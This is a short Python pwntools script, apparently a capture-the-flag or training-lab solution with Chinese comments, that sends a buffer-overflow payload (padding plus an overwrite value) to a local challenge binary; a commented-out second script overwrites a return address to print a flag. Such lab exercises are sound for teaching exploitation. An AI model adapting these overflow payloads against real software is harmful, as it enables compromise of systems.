#!/usr/bin/env python

from pwn import *

binary_path = "./buffer-overflow-level1.0"

def print_lines(io):
    info("Printing program output:")
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

# 设置缓冲区溢出的 payload
payload = b"A" * 28 + b"\xef\xbe\xad\xde" + b"\x00" * 4
# 加载 ELF 文件
elf = ELF(binary_path)
# 启动程序进程
p = process(elf.path)
# 发送 payload
p.sendline(payload)
# 打印程序的输出
print_lines(p)
# 关闭进程
p.close()

# from pwn import *

# context(arch="amd64", os="linux", log_level="debug")

# path = "/challenge/integer-overflow-level1.1"
# payload = b'A' * 0x108 +p64(0x4012ab,endian='little')
# p = process(path)

# #payload = p(0xdeadbeef, endian='little')+b'\n'

# p.sendlineafter("Give me your input\n",b"280")
# p.sendlineafter("Give me your payload\n",payload)
# flag = p.recvline().decode()
# print(flag)

# p.close()
